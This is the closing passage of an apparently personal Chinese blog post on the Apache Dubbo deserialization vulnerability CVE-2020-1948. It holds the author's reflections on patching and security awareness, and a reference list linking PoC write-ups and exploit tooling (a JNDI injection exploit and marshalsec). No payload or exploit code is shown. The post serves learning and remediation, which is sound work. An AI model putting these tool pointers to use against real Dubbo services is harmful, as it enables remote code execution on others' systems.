<h2 id="絮叨"><a href="#絮叨" class="headerlink" title="絮叨"></a>絮叨</h2><p>隔行如隔山，一山还有一山高，修复漏洞真困难。感慨漏洞发现者们，多亏这些白帽子的仔细，揭露了这么多可攻击点，将漏洞信息提交到安全中心，让使用方了解到漏洞详情。</p>
<p>还有 <code>Dubbo</code> 这个中间件的社区活跃度很高，出现问题后，大家讨论的热情高涨，积极去修复漏洞，社区活跃度高，代码更新快，支持的功能越来越多，使用起来也更放心。</p>
<p>通过这次分析，了解到挺多基础的安全知识，感觉随着开源代码被研究更透彻，可供攻击的点也越来越多，在代码设计和编写时，也得注意一下安全信息，避免被攻击。</p>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1、<a href="https://xlab.tencent.com/cn/2020/06/23/xlab-20-001/" target="_blank" rel="noopener">Apache Dubbo Provider 远程代码执行漏洞 (CVE-2020-1948)</a></p>
<p>2、<a href="https://www.sayers.top/cve_2020_1948.html" target="_blank" rel="noopener">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948) 利用复现及POC</a></p>
<p>3、<a href="https://paper.seebug.org/1266/" target="_blank" rel="noopener">Apache Dubbo (CVE-2020-1948) 反序列化漏洞及其补丁绕过深度分析</a></p>
<p>4、<a href="https://mp.weixin.qq.com/s/wU1iacELbhspWMftRIQdeA" target="_blank" rel="noopener">Apache Dubbo漏洞CVE-2020-1948分析</a></p>
<p>5、<a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>
<p>6、<a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md" target="_blank" rel="noopener">LADP、RMI 注入程序原理说明</a></p>
<p>7、<a href="https://github.com/sayers522/JNDI-Injection-Exploit" target="_blank" rel="noopener">示范例子使用的注入程序</a></p>
<p>8、<a href="https://www.geekby.xyz/2020/07/01/apache-dubbo-provider-fan-xu-lie-hua-lou-dong-cve-2020-1948/" target="_blank" rel="noopener">Apache Dubbo Provider反序列化漏洞(CVE-2020-1948)</a></p>
<p>9、<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec 工具包</a></p>
<p>10、<a href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/" target="_blank" rel="noopener">渗透中 PoC、Exp、Payload 与 Shellcode 的区别</a></p>
<p>11、<a href="https://github.com/apache/dubbo/issues/6364" target="_blank" rel="noopener">Github 社区讨论</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Java/" rel="tag"># Java</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/07/15/java/2020-07-15-maven-archetypr/" rel="next" title="使用 mvn archetype 创建模板工程">
                <i class="fa fa-chevron-left"></i> 使用 mvn archetype 创建模板工程
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/08/21/reading/2020-08-21-op-introduction-reading/" rel="prev" title="《操作系统导论》学习小结">
                《操作系统导论》学习小结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNjEzNi8xMjY3MQ=="></div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="http://img.sevenyuan.cn/panda.jpg" alt="JingQ">
          <p class="site-author-name" itemprop="name">JingQ</p>
           
              <p class="site-description motion-element" itemprop="description">努力学习</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">95</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">28</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">22</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Vip-Augus" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://www.weibo.com/yjq41596" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://www.douban.com/people/YeJingQi" target="_blank" title="Douban">
                  
                    <i class="fa fa-fw fa-anchor"></i>
                  
                    
                      Douban
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="mailto://JingQBoom@gmail.com" target="_blank" title="E-Mail">
                  
                    <i class="fa fa-fw fa-envelope"></i>
                  
                    
                      E-Mail
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞详情"><span class="nav-number">1.</span> <span class="nav-text">漏洞详情</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#名词解释"><span class="nav-number">2.</span> <span class="nav-text">名词解释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模拟-Provider"><span class="nav-number">3.1.</span> <span class="nav-text">模拟 Provider</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行-JNDI-程序"><span class="nav-number">3.2.</span> <span class="nav-text">运行 JNDI 程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造-PoC-对应的-payload"><span class="nav-number">3.3.</span> <span class="nav-text">构造 PoC 对应的 payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现小结"><span class="nav-number">3.4.</span> <span class="nav-text">漏洞复现小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理简述"><span class="nav-number">4.</span> <span class="nav-text">漏洞原理简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#社区讨论-amp-安全网站修复建议"><span class="nav-number">5.</span> <span class="nav-text">社区讨论&amp;安全网站修复建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#思考分析-amp-修复思路"><span class="nav-number">6.</span> <span class="nav-text">思考分析&amp;修复思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、复现条件有限"><span class="nav-number">6.1.</span> <span class="nav-text">1、复现条件有限</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、社区讨论内容"><span class="nav-number">6.2.</span> <span class="nav-text">2、社区讨论内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、结合业务分析"><span class="nav-number">6.3.</span> <span class="nav-text">3、结合业务分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#絮叨"><span class="nav-number">7.</span> <span class="nav-text">絮叨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">8.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-JingQ"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">JingQ</span>
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_uv"></span>
</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<a href="http://www.beian.miit.gov.cn">浙ICP备17002280号-1</a> 

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Muse
  </a>
</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i> 访问人数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i> 总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  
    <script type="text/javascript">
      (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
      })(document, 'script');
    </script>
  






  





  

  

  

  

  

  

  
</body>
</html>
